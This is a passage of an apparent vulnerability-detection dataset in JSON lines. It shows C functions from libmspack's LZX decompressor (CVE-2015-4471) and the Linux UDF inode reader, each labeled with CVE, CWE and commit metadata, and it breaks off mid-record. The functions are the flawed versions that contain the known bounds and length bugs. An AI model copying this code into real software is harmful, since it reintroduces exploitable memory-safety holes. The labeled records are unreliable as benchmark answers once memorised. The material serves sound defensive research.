the intel header and reset the huffman lengths */\n      lzxd_reset_state(lzx);\n      R0 = lzx->R0;\n      R1 = lzx->R1;\n      R2 = lzx->R2;\n    }\n\n    /* LZX DELTA format has chunk_size, not present in LZX format */\n    if (lzx->is_delta) {\n      ENSURE_BITS(16);\n      REMOVE_BITS(16);\n    }\n\n    /* read header if necessary */\n    if (!lzx->header_read) {\n      /* read 1 bit. if bit=0, intel filesize = 0.\n       * if bit=1, read intel filesize (32 bits) */\n      j = 0; READ_BITS(i, 1); if (i) { READ_BITS(i, 16); READ_BITS(j, 16); }\n      lzx->intel_filesize = (i << 16) | j;\n      lzx->header_read = 1;\n    } \n\n    /* calculate size of frame: all frames are 32k except the final frame\n     * which is 32kb or less. this can only be calculated when lzx->length\n     * has been filled in. */\n    frame_size = LZX_FRAME_SIZE;\n    if (lzx->length && (lzx->length - lzx->offset) < (off_t)frame_size) {\n      frame_size = lzx->length - lzx->offset;\n    }\n\n    /* decode until one more frame is available */\n    bytes_todo = lzx->frame_posn + frame_size - window_posn;\n    while (bytes_todo > 0) {\n      /* initialise new block, if one is needed */\n      if (lzx->block_remaining == 0) {\n\t/* realign if previous block was an odd-sized UNCOMPRESSED block */\n\tif ((lzx->block_type == LZX_BLOCKTYPE_UNCOMPRESSED) &&\n\t    (lzx->block_length & 1))\n\t{\n\t  READ_IF_NEEDED;\n\t  i_ptr++;\n\t}\n\n\t/* read block type (3 bits) and block length (24 bits) */\n\tREAD_BITS(lzx->block_type, 3);\n\tREAD_BITS(i, 16); READ_BITS(j, 8);\n\tlzx->block_remaining = lzx->block_length = (i << 8) | j;\n\t/*D((\"new block t%d len %u\", lzx->block_type, lzx->block_length))*/\n\n\t/* read individual block headers */\n\tswitch (lzx->block_type) {\n\tcase LZX_BLOCKTYPE_ALIGNED:\n\t  /* read lengths of and build aligned huffman decoding tree */\n\t  for (i = 0; i < 8; i++) { READ_BITS(j, 3); lzx->ALIGNED_len[i] = j; }\n\t  BUILD_TABLE(ALIGNED);\n\t  /* no break -- rest of aligned header is same as verbatim */\n\tcase LZX_BLOCKTYPE_VERBATIM:\n\t  /* read lengths of and build main huffman decoding tree */\n\t  READ_LENGTHS(MAINTREE, 0, 256);\n\t  READ_LENGTHS(MAINTREE, 256, LZX_NUM_CHARS + lzx->num_offsets);\n\t  BUILD_TABLE(MAINTREE);\n\t  /* if the literal 0xE8 is anywhere in the block... */\n\t  if (lzx->MAINTREE_len[0xE8] != 0) lzx->intel_started = 1;\n\t  /* read lengths of and build lengths huffman decoding tree */\n\t  READ_LENGTHS(LENGTH, 0, LZX_NUM_SECONDARY_LENGTHS);\n\t  BUILD_TABLE_MAYBE_EMPTY(LENGTH);\n\t  break;\n\n\tcase LZX_BLOCKTYPE_UNCOMPRESSED:\n\t  /* because we can't assume otherwise */\n \t  lzx->intel_started = 1;\n \n \t  /* read 1-16 (not 0-15) bits to align to bytes */\n\t  ENSURE_BITS(16);\n\t  if (bits_left > 16) i_ptr -= 2;\n \t  bits_left = 0; bit_buffer = 0;\n \n \t  /* read 12 bytes of stored R0 / R1 / R2 values */\n\t  for (rundest = &buf[0], i = 0; i < 12; i++) {\n\t    READ_IF_NEEDED;\n\t    *rundest++ = *i_ptr++;\n\t  }\n\t  R0 = buf[0] | (buf[1] << 8) | (buf[2]  << 16) | (buf[3]  << 24);\n\t  R1 = buf[4] | (buf[5] << 8) | (buf[6]  << 16) | (buf[7]  << 24);\n\t  R2 = buf[8] | (buf[9] << 8) | (buf[10] << 16) | (buf[11] << 24);\n\t  break;\n\n\tdefault:\n\t  D((\"bad block type\"))\n\t  return lzx->error = MSPACK_ERR_DECRUNCH;\n\t}\n      }\n\n      /* decode more of the block:\n       * run = min(what's available, what's needed) */\n      this_run = lzx->block_remaining;\n      if (this_run > bytes_todo) this_run = bytes_todo;\n\n      /* assume we decode exactly this_run bytes, for now */\n      bytes_todo           -= this_run;\n      lzx->block_remaining -= this_run;\n\n      /* decode at least this_run bytes */\n      switch (lzx->block_type) {\n      case LZX_BLOCKTYPE_VERBATIM:\n\twhile (this_run > 0) {\n\t  READ_HUFFSYM(MAINTREE, main_element);\n\t  if (main_element < LZX_NUM_CHARS) {\n\t    /* literal: 0 to LZX_NUM_CHARS-1 */\n\t    window[window_posn++] = main_element;\n\t    this_run--;\n\t  }\n\t  else {\n\t    /* match: LZX_NUM_CHARS + ((slot<<3) | length_header (3 bits)) */\n\t    main_element -= LZX_NUM_CHARS;\n\n\t    /* get match length */\n\t    match_length = main_element & LZX_NUM_PRIMARY_LENGTHS;\n\t    if (match_length == LZX_NUM_PRIMARY_LENGTHS) {\n\t      if (lzx->LENGTH_empty) {\n                D((\"LENGTH symbol needed but tree is empty\"))\n                return lzx->error = MSPACK_ERR_DECRUNCH;\n              }\n\t      READ_HUFFSYM(LENGTH, length_footer);\n\t      match_length += length_footer;\n\t    }\n\t    match_length += LZX_MIN_MATCH;\n\n\t    /* get match offset */\n\t    switch ((match_offset = (main_element >> 3))) {\n\t    case 0: match_offset = R0;                                  break;\n\t    case 1: match_offset = R1; R1=R0;        R0 = match_offset; break;\n\t    case 2: match_offset = R2; R2=R0;        R0 = match_offset; break;\n\t    case 3: match_offset = 1;  R2=R1; R1=R0; R0 = match_offset; break;\n\t    default:\n\t      extra = (match_offset >= 36) ? 17 : extra_bits[match_offset];\n\t      READ_BITS(verbatim_bits, extra);\n\t      match_offset = position_base[match_offset] - 2 + verbatim_bits;\n\t      R2 = R1; R1 = R0; R0 = match_offset;\n\t    }\n\n\t    /* LZX DELTA uses max match length to signal even longer match */\n\t    if (match_length == LZX_MAX_MATCH && lzx->is_delta) {\n\t\tint extra_len = 0;\n\t\tENSURE_BITS(3); /* 4 entry huffman tree */\n\t\tif (PEEK_BITS(1) == 0) {\n\t\t    REMOVE_BITS(1); /* '0' -> 8 extra length bits */\n\t\t    READ_BITS(extra_len, 8);\n\t\t}\n\t\telse if (PEEK_BITS(2) == 2) {\n\t\t    REMOVE_BITS(2); /* '10' -> 10 extra length bits + 0x100 */\n\t\t    READ_BITS(extra_len, 10);\n\t\t    extra_len += 0x100;\n\t\t}\n\t\telse if (PEEK_BITS(3) == 6) {\n\t\t    REMOVE_BITS(3); /* '110' -> 12 extra length bits + 0x500 */\n\t\t    READ_BITS(extra_len, 12);\n\t\t    extra_len += 0x500;\n\t\t}\n\t\telse {\n\t\t    REMOVE_BITS(3); /* '111' -> 15 extra length bits */\n\t\t    READ_BITS(extra_len, 15);\n\t\t}\n\t\tmatch_length += extra_len;\n\t    }\n\n\t    if ((window_posn + match_length) > lzx->window_size) {\n\t      D((\"match ran over window wrap\"))\n\t      return lzx->error = MSPACK_ERR_DECRUNCH;\n\t    }\n\t    \n\t    /* copy match */\n\t    rundest = &window[window_posn];\n\t    i = match_length;\n\t    /* does match offset wrap the window? */\n\t    if (match_offset > window_posn) {\n\t      if (match_offset > lzx->offset &&\n\t\t  (match_offset - window_posn) > lzx->ref_data_size)\n\t      {\n\t\tD((\"match offset beyond LZX stream\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      /* j = length from match offset to end of window */\n\t      j = match_offset - window_posn;\n\t      if (j > (int) lzx->window_size) {\n\t\tD((\"match offset beyond window boundaries\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      runsrc = &window[lzx->window_size - j];\n\t      if (j < i) {\n\t\t/* if match goes over the window edge, do two copy runs */\n\t\ti -= j; while (j-- > 0) *rundest++ = *runsrc++;\n\t\trunsrc = window;\n\t      }\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\t    else {\n\t      runsrc = rundest - match_offset;\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\n\t    this_run    -= match_length;\n\t    window_posn += match_length;\n\t  }\n\t} /* while (this_run > 0) */\n\tbreak;\n\n      case LZX_BLOCKTYPE_ALIGNED:\n\twhile (this_run > 0) {\n\t  READ_HUFFSYM(MAINTREE, main_element);\n\t  if (main_element < LZX_NUM_CHARS) {\n\t    /* literal: 0 to LZX_NUM_CHARS-1 */\n\t    window[window_posn++] = main_element;\n\t    this_run--;\n\t  }\n\t  else {\n\t    /* match: LZX_NUM_CHARS + ((slot<<3) | length_header (3 bits)) */\n\t    main_element -= LZX_NUM_CHARS;\n\n\t    /* get match length */\n\t    match_length = main_element & LZX_NUM_PRIMARY_LENGTHS;\n\t    if (match_length == LZX_NUM_PRIMARY_LENGTHS) {\n              if (lzx->LENGTH_empty) {\n                D((\"LENGTH symbol needed but tree is empty\"))\n                return lzx->error = MSPACK_ERR_DECRUNCH;\n              } \n\t      READ_HUFFSYM(LENGTH, length_footer);\n\t      match_length += length_footer;\n\t    }\n\t    match_length += LZX_MIN_MATCH;\n\n\t    /* get match offset */\n\t    switch ((match_offset = (main_element >> 3))) {\n\t    case 0: match_offset = R0;                             break;\n\t    case 1: match_offset = R1; R1 = R0; R0 = match_offset; break;\n\t    case 2: match_offset = R2; R2 = R0; R0 = match_offset; break;\n\t    default:\n\t      extra = (match_offset >= 36) ? 17 : extra_bits[match_offset];\n\t      match_offset = position_base[match_offset] - 2;\n\t      if (extra > 3) {\n\t\t/* verbatim and aligned bits */\n\t\textra -= 3;\n\t\tREAD_BITS(verbatim_bits, extra);\n\t\tmatch_offset += (verbatim_bits << 3);\n\t\tREAD_HUFFSYM(ALIGNED, aligned_bits);\n\t\tmatch_offset += aligned_bits;\n\t      }\n\t      else if (extra == 3) {\n\t\t/* aligned bits only */\n\t\tREAD_HUFFSYM(ALIGNED, aligned_bits);\n\t\tmatch_offset += aligned_bits;\n\t      }\n\t      else if (extra > 0) { /* extra==1, extra==2 */\n\t\t/* verbatim bits only */\n\t\tREAD_BITS(verbatim_bits, extra);\n\t\tmatch_offset += verbatim_bits;\n\t      }\n\t      else /* extra == 0 */ {\n\t\t/* ??? not defined in LZX specification! */\n\t\tmatch_offset = 1;\n\t      }\n\t      /* update repeated offset LRU queue */\n\t      R2 = R1; R1 = R0; R0 = match_offset;\n\t    }\n\n\t    /* LZX DELTA uses max match length to signal even longer match */\n\t    if (match_length == LZX_MAX_MATCH && lzx->is_delta) {\n\t\tint extra_len = 0;\n\t\tENSURE_BITS(3); /* 4 entry huffman tree */\n\t\tif (PEEK_BITS(1) == 0) {\n\t\t    REMOVE_BITS(1); /* '0' -> 8 extra length bits */\n\t\t    READ_BITS(extra_len, 8);\n\t\t}\n\t\telse if (PEEK_BITS(2) == 2) {\n\t\t    REMOVE_BITS(2); /* '10' -> 10 extra length bits + 0x100 */\n\t\t    READ_BITS(extra_len, 10);\n\t\t    extra_len += 0x100;\n\t\t}\n\t\telse if (PEEK_BITS(3) == 6) {\n\t\t    REMOVE_BITS(3); /* '110' -> 12 extra length bits + 0x500 */\n\t\t    READ_BITS(extra_len, 12);\n\t\t    extra_len += 0x500;\n\t\t}\n\t\telse {\n\t\t    REMOVE_BITS(3); /* '111' -> 15 extra length bits */\n\t\t    READ_BITS(extra_len, 15);\n\t\t}\n\t\tmatch_length += extra_len;\n\t    }\n\n\t    if ((window_posn + match_length) > lzx->window_size) {\n\t      D((\"match ran over window wrap\"))\n\t      return lzx->error = MSPACK_ERR_DECRUNCH;\n\t    }\n\n\t    /* copy match */\n\t    rundest = &window[window_posn];\n\t    i = match_length;\n\t    /* does match offset wrap the window? */\n\t    if (match_offset > window_posn) {\n\t      if (match_offset > lzx->offset &&\n\t\t  (match_offset - window_posn) > lzx->ref_data_size)\n\t      {\n\t\tD((\"match offset beyond LZX stream\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      /* j = length from match offset to end of window */\n\t      j = match_offset - window_posn;\n\t      if (j > (int) lzx->window_size) {\n\t\tD((\"match offset beyond window boundaries\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      runsrc = &window[lzx->window_size - j];\n\t      if (j < i) {\n\t\t/* if match goes over the window edge, do two copy runs */\n\t\ti -= j; while (j-- > 0) *rundest++ = *runsrc++;\n\t\trunsrc = window;\n\t      }\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\t    else {\n\t      runsrc = rundest - match_offset;\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\n\t    this_run    -= match_length;\n\t    window_posn += match_length;\n\t  }\n\t} /* while (this_run > 0) */\n\tbreak;\n\n      case LZX_BLOCKTYPE_UNCOMPRESSED:\n\t/* as this_run is limited not to wrap a frame, this also means it\n\t * won't wrap the window (as the window is a multiple of 32k) */\n\trundest = &window[window_posn];\n\twindow_posn += this_run;\n\twhile (this_run > 0) {\n\t  if ((i = i_end - i_ptr) == 0) {\n\t    READ_IF_NEEDED;\n\t  }\n\t  else {\n\t    if (i > this_run) i = this_run;\n\t    lzx->sys->copy(i_ptr, rundest, (size_t) i);\n\t    rundest  += i;\n\t    i_ptr    += i;\n\t    this_run -= i;\n\t  }\n\t}\n\tbreak;\n\n      default:\n\treturn lzx->error = MSPACK_ERR_DECRUNCH; /* might as well */\n      }\n\n      /* did the final match overrun our desired this_run length? */\n      if (this_run < 0) {\n\tif ((unsigned int)(-this_run) > lzx->block_remaining) {\n\t  D((\"overrun went past end of block by %d (%d remaining)\",\n\t     -this_run, lzx->block_remaining ))\n\t  return lzx->error = MSPACK_ERR_DECRUNCH;\n\t}\n\tlzx->block_remaining -= -this_run;\n      }\n    } /* while (bytes_todo > 0) */\n\n    /* streams don't extend over frame boundaries */\n    if ((window_posn - lzx->frame_posn) != frame_size) {\n      D((\"decode beyond output frame limits! %d != %d\",\n\t window_posn - lzx->frame_posn, frame_size))\n      return lzx->error = MSPACK_ERR_DECRUNCH;\n    }\n\n    /* re-align input bitstream */\n    if (bits_left > 0) ENSURE_BITS(16);\n    if (bits_left & 15) REMOVE_BITS(bits_left & 15);\n\n    /* check that we've used all of the previous frame first */\n    if (lzx->o_ptr != lzx->o_end) {\n      D((\"%ld avail bytes, new %d frame\",\n          (long)(lzx->o_end - lzx->o_ptr), frame_size))\n      return lzx->error = MSPACK_ERR_DECRUNCH;\n    }\n\n    /* does this intel block _really_ need decoding? */\n    if (lzx->intel_started && lzx->intel_filesize &&\n\t(lzx->frame <= 32768) && (frame_size > 10))\n    {\n      unsigned char *data    = &lzx->e8_buf[0];\n      unsigned char *dataend = &lzx->e8_buf[frame_size - 10];\n      signed int curpos      = lzx->intel_curpos;\n      signed int filesize    = lzx->intel_filesize;\n      signed int abs_off, rel_off;\n\n      /* copy e8 block to the e8 buffer and tweak if needed */\n      lzx->o_ptr = data;\n      lzx->sys->copy(&lzx->window[lzx->frame_posn], data, frame_size);\n\n      while (data < dataend) {\n\tif (*data++ != 0xE8) { curpos++; continue; }\n\tabs_off = data[0] | (data[1]<<8) | (data[2]<<16) | (data[3]<<24);\n\tif ((abs_off >= -curpos) && (abs_off < filesize)) {\n\t  rel_off = (abs_off >= 0) ? abs_off - curpos : abs_off + filesize;\n\t  data[0] = (unsigned char) rel_off;\n\t  data[1] = (unsigned char) (rel_off >> 8);\n\t  data[2] = (unsigned char) (rel_off >> 16);\n\t  data[3] = (unsigned char) (rel_off >> 24);\n\t}\n\tdata += 4;\n\tcurpos += 5;\n      }\n      lzx->intel_curpos += frame_size;\n    }\n    else {\n      lzx->o_ptr = &lzx->window[lzx->frame_posn];\n      if (lzx->intel_filesize) lzx->intel_curpos += frame_size;\n    }\n    lzx->o_end = &lzx->o_ptr[frame_size];\n\n    /* write a frame */\n    i = (out_bytes < (off_t)frame_size) ? (unsigned int)out_bytes : frame_size;\n    if (lzx->sys->write(lzx->output, lzx->o_ptr, i) != i) {\n      return lzx->error = MSPACK_ERR_WRITE;\n    }\n    lzx->o_ptr  += i;\n    lzx->offset += i;\n    out_bytes   -= i;\n\n    /* advance frame start position */\n    lzx->frame_posn += frame_size;\n    lzx->frame++;\n\n    /* wrap window / frame position pointers */\n    if (window_posn == lzx->window_size)     window_posn = 0;\n    if (lzx->frame_posn == lzx->window_size) lzx->frame_posn = 0;\n\n  } /* while (lzx->frame < end_frame) */\n\n  if (out_bytes) {\n    D((\"bytes left to output\"))\n    return lzx->error = MSPACK_ERR_DECRUNCH;\n  }\n\n  /* store local state */\n  STORE_BITS;\n  lzx->window_posn = window_posn;\n  lzx->R0 = R0;\n  lzx->R1 = R1;\n  lzx->R2 = R2;\n\n  return MSPACK_ERR_OK;\n}\n", "func_hash": 301703386296293359276381348380541750369, "file_name": "lzxd.c", "file_hash": 337003730914340010531750334497602428047, "cwe": ["CWE-189"], "cve": "CVE-2015-4471", "cve_desc": "Off-by-one error in the lzxd_decompress function in lzxd.c in libmspack before 0.5 allows remote attackers to cause a denial of service (buffer under-read and application crash) via a crafted CAB archive.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-4471"}
{"idx": 1470, "project": "linux", "commit_id": "23b133bdc452aa441fcb9b82cbf6dd05cfd342d0", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/23b133bdc452aa441fcb9b82cbf6dd05cfd342d0", "commit_message": "udf: Check length of extended attributes and allocation descriptors\n\nCheck length of extended attributes and allocation descriptors when\nloading inodes from disk. Otherwise corrupted filesystems could confuse\nthe code and make the kernel oops.\n\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no>\nCC: stable@vger.kernel.org\nSigned-off-by: Jan Kara <jack@suse.cz>", "target": 1, "func": "static int udf_read_inode(struct inode *inode, bool hidden_inode)\n{\n\tstruct buffer_head *bh = NULL;\n\tstruct fileEntry *fe;\n\tstruct extendedFileEntry *efe;\n\tuint16_t ident;\n\tstruct udf_inode_info *iinfo = UDF_I(inode);\n\tstruct udf_sb_info *sbi = UDF_SB(inode->i_sb);\n\tstruct kernel_lb_addr *iloc = &iinfo->i_location;\n\tunsigned int link_count;\n\tunsigned int indirections = 0;\n\tint bs = inode->i_sb->s_blocksize;\n\tint ret = -EIO;\n\nreread:\n\tif (iloc->logicalBlockNum >=\n\t    sbi->s_partmaps[iloc->partitionReferenceNum].s_partition_len) {\n\t\tudf_debug(\"block=%d, partition=%d out of range\\n\",\n\t\t\t  iloc->logicalBlockNum, iloc->partitionReferenceNum);\n\t\treturn -EIO;\n\t}\n\n\t/*\n\t * Set defaults, but the inode is still incomplete!\n\t * Note: get_new_inode() sets the following on a new inode:\n\t *      i_sb = sb\n\t *      i_no = ino\n\t *      i_flags = sb->s_flags\n\t *      i_state = 0\n\t * clean_inode(): zero fills and sets\n\t *      i_count = 1\n\t *      i_nlink = 1\n\t *      i_op = NULL;\n\t */\n\tbh = udf_read_ptagged(inode->i_sb, iloc, 0, &ident);\n\tif (!bh) {\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed !bh\\n\", inode->i_ino);\n\t\treturn -EIO;\n\t}\n\n\tif (ident != TAG_IDENT_FE && ident != TAG_IDENT_EFE &&\n\t    ident != TAG_IDENT_USE) {\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed ident=%d\\n\",\n\t\t\tinode->i_ino, ident);\n\t\tgoto out;\n\t}\n\n\tfe = (struct fileEntry *)bh->b_data;\n\tefe = (struct extendedFileEntry *)bh->b_data;\n\n\tif (fe->icbTag.strategyType == cpu_to_le16(4096)) {\n\t\tstruct buffer_head *ibh;\n\n\t\tibh = udf_read_ptagged(inode->i_sb, iloc, 1, &ident);\n\t\tif (ident == TAG_IDENT_IE && ibh) {\n\t\t\tstruct kernel_lb_addr loc;\n\t\t\tstruct indirectEntry *ie;\n\n\t\t\tie = (struct indirectEntry *)ibh->b_data;\n\t\t\tloc = lelb_to_cpu(ie->indirectICB.extLocation);\n\n\t\t\tif (ie->indirectICB.extLength) {\n\t\t\t\tbrelse(ibh);\n\t\t\t\tmemcpy(&iinfo->i_location, &loc,\n\t\t\t\t       sizeof(struct kernel_lb_addr));\n\t\t\t\tif (++indirections > UDF_MAX_ICB_NESTING) {\n\t\t\t\t\tudf_err(inode->i_sb,\n\t\t\t\t\t\t\"too many ICBs in ICB hierarchy\"\n\t\t\t\t\t\t\" (max %d supported)\\n\",\n\t\t\t\t\t\tUDF_MAX_ICB_NESTING);\n\t\t\t\t\tgoto out;\n\t\t\t\t}\n\t\t\t\tbrelse(bh);\n\t\t\t\tgoto reread;\n\t\t\t}\n\t\t}\n\t\tbrelse(ibh);\n\t} else if (fe->icbTag.strategyType != cpu_to_le16(4)) {\n\t\tudf_err(inode->i_sb, \"unsupported strategy type: %d\\n\",\n\t\t\tle16_to_cpu(fe->icbTag.strategyType));\n\t\tgoto out;\n\t}\n\tif (fe->icbTag.strategyType == cpu_to_le16(4))\n\t\tiinfo->i_strat4096 = 0;\n\telse /* if (fe->icbTag.strategyType == cpu_to_le16(4096)) */\n\t\tiinfo->i_strat4096 = 1;\n\n\tiinfo->i_alloc_type = le16_to_cpu(fe->icbTag.flags) &\n\t\t\t\t\t\t\tICBTAG_FLAG_AD_MASK;\n\tiinfo->i_unique = 0;\n\tiinfo->i_lenEAttr = 0;\n\tiinfo->i_lenExtents = 0;\n\tiinfo->i_lenAlloc = 0;\n\tiinfo->i_next_alloc_block = 0;\n\tiinfo->i_next_alloc_goal = 0;\n\tif (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_EFE)) {\n\t\tiinfo->i_efe = 1;\n\t\tiinfo->i_use = 0;\n\t\tret = udf_alloc_i_data(inode, bs -\n\t\t\t\t\tsizeof(struct extendedFileEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct extendedFileEntry),\n\t\t       bs - sizeof(struct extendedFileEntry));\n\t} else if (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_FE)) {\n\t\tiinfo->i_efe = 0;\n\t\tiinfo->i_use = 0;\n\t\tret = udf_alloc_i_data(inode, bs - sizeof(struct fileEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct fileEntry),\n\t\t       bs - sizeof(struct fileEntry));\n\t} else if (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_USE)) {\n\t\tiinfo->i_efe = 0;\n\t\tiinfo->i_use = 1;\n\t\tiinfo->i_lenAlloc = le32_to_cpu(\n\t\t\t\t((struct unallocSpaceEntry *)bh->b_data)->\n\t\t\t\t lengthAllocDescs);\n\t\tret = udf_alloc_i_data(inode, bs -\n\t\t\t\t\tsizeof(struct unallocSpaceEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct unallocSpaceEntry),\n\t\t       bs - sizeof(struct unallocSpaceEntry));\n\t\treturn 0;\n\t}\n\n\tret = -EIO;\n\tread_lock(&sbi->s_cred_lock);\n\ti_uid_write(inode, le32_to_cpu(fe->uid));\n\tif (!uid_valid(inode->i_uid) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_UID_IGNORE) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_UID_SET))\n\t\tinode->i_uid = UDF_SB(inode->i_sb)->s_uid;\n\n\ti_gid_write(inode, le32_to_cpu(fe->gid));\n\tif (!gid_valid(inode->i_gid) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_GID_IGNORE) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_GID_SET))\n\t\tinode->i_gid = UDF_SB(inode->i_sb)->s_gid;\n\n\tif (fe->icbTag.fileType != ICBTAG_FILE_TYPE_DIRECTORY &&\n\t\t\tsbi->s_fmode != UDF_INVALID_MODE)\n\t\tinode->i_mode = sbi->s_fmode;\n\telse if (fe->icbTag.fileType == ICBTAG_FILE_TYPE_DIRECTORY &&\n\t\t\tsbi->s_dmode != UDF_INVALID_MODE)\n\t\tinode->i_mode = sbi->s_dmode;\n\telse\n\t\tinode->i_mode = udf_convert_permissions(fe);\n\tinode->i_mode &= ~sbi->s_umask;\n\tread_unlock(&sbi->s_cred_lock);\n\n\tlink_count = le16_to_cpu(fe->fileLinkCount);\n\tif (!link_count) {\n\t\tif (!hidden_inode) {\n\t\t\tret = -ESTALE;\n\t\t\tgoto out;\n\t\t}\n\t\tlink_count = 1;\n\t}\n\tset_nlink(inode, link_count);\n\n\tinode->i_size = le64_to_cpu(fe->informationLength);\n\tiinfo->i_lenExtents = inode->i_size;\n\n\tif (iinfo->i_efe == 0) {\n\t\tinode->i_blocks = le64_to_cpu(fe->logicalBlocksRecorded) <<\n\t\t\t(inode->i_sb->s_blocksize_bits - 9);\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_atime, fe->accessTime))\n\t\t\tinode->i_atime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_mtime,\n\t\t\t\t\t    fe->modificationTime))\n\t\t\tinode->i_mtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_ctime, fe->attrTime))\n\t\t\tinode->i_ctime = sbi->s_record_time;\n\n\t\tiinfo->i_unique = le64_to_cpu(fe->uniqueID);\n\t\tiinfo->i_lenEAttr = le32_to_cpu(fe->lengthExtendedAttr);\n\t\tiinfo->i_lenAlloc = le32_to_cpu(fe->lengthAllocDescs);\n\t\tiinfo->i_checkpoint = le32_to_cpu(fe->checkpoint);\n\t} else {\n\t\tinode->i_blocks = le64_to_cpu(efe->logicalBlocksRecorded) <<\n\t\t    (inode->i_sb->s_blocksize_bits - 9);\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_atime, efe->accessTime))\n\t\t\tinode->i_atime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_mtime,\n\t\t\t\t\t    efe->modificationTime))\n\t\t\tinode->i_mtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&iinfo->i_crtime, efe->createTime))\n\t\t\tiinfo->i_crtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_ctime, efe->attrTime))\n\t\t\tinode->i_ctime = sbi->s_record_time;\n\n\t\tiinfo->i_unique = le64_to_cpu(efe->uniqueID);\n\t\tiinfo->i_lenEAttr = le32_to_cpu(efe->lengthExtendedAttr);\n\t\tiinfo->i_lenAlloc = le32_to_cpu(efe->lengthAllocDescs);\n\t\tiinfo->i_checkpoint = le32_to_cpu(efe->checkpoint);\n \t}\n \tinode->i_generation = iinfo->i_unique;\n \n \t/* Sanity checks for files in ICB so that we don't get confused later */\n \tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {\n \t\t/*\n\t\t * For file in ICB data is stored in allocation descriptor\n\t\t * so sizes should match\n\t\t */\n\t\tif (iinfo->i_lenAlloc != inode->i_size)\n\t\t\tgoto out;\n\t\t/* File in ICB has to fit in there... */\n\t\tif (inode->i_size > bs - udf_file_entry_alloc_offset(inode))\n\t\t\tgoto out;\n\t}\n\n\tswitch (fe->icbTag.fileType) {\n\tcase ICBTAG_FILE_TYPE_DIRECTORY:\n\t\tinode->i_op = &udf_dir_inode_operations;\n\t\tinode->i_fop = &udf_dir_operations;\n\t\tinode->i_mode |= S_IFDIR;\n\t\tinc_nlink(inode);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_REALTIME:\n\tcase ICBTAG_FILE_TYPE_REGULAR:\n\tcase ICBTAG_FILE_TYPE_UNDEF:\n\tcase ICBTAG_FILE_TYPE_VAT20:\n\t\tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB)\n\t\t\tinode->i_data.a_ops = &udf_adinicb_aops;\n\t\telse\n\t\t\tinode->i_data.a_ops = &udf_aops;\n\t\tinode->i_op = &udf_file_inode_operations;\n\t\tinode->i_fop = &udf_file_operations;\n\t\tinode->i_mode |= S_IFREG;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_BLOCK:\n\t\tinode->i_mode |= S_IFBLK;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_CHAR:\n\t\tinode->i_mode |= S_IFCHR;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_FIFO:\n\t\tinit_special_inode(inode, inode->i_mode | S_IFIFO, 0);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_SOCKET:\n\t\tinit_special_inode(inode, inode->i_mode | S_IFSOCK, 0);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_SYMLINK:\n\t\tinode->i_data.a_ops = &udf_symlink_aops;\n\t\tinode->i_op = &udf_symlink_inode_operations;\n\t\tinode->i_mode = S_IFLNK | S_IRWXUGO;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_MAIN:\n\t\tudf_debug(\"METADATA FILE-----\\n\");\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_MIRROR:\n\t\tudf_debug(\"METADATA MIRROR FILE-----\\n\");\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_BITMAP:\n\t\tudf_debug(\"METADATA BITMAP FILE-----\\n\");\n\t\tbreak;\n\tdefault:\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed unknown file type=%d\\n\",\n\t\t\tinode->i_ino, fe->icbTag.fileType);\n\t\tgoto out;\n\t}\n\tif (S_ISCHR(inode->i_mode) || S_ISBLK(inode->i_mode)) {\n\t\tstruct deviceSpec *dsea =\n\t\t\t(struct deviceSpec *)udf_get_extendedattr(inode, 12, 1);\n\t\tif (dsea) {\n\t\t\tinit_special_inode(inode, inode->i_mode,\n\t\t\t\tMKDEV(le32_to_cpu(dsea->majorDeviceIdent),\n\t\t\t\t      le32_to_cpu(dsea->minorDeviceIdent)));\n\t\t\t/* Developer ID ??? */\n\t\t} 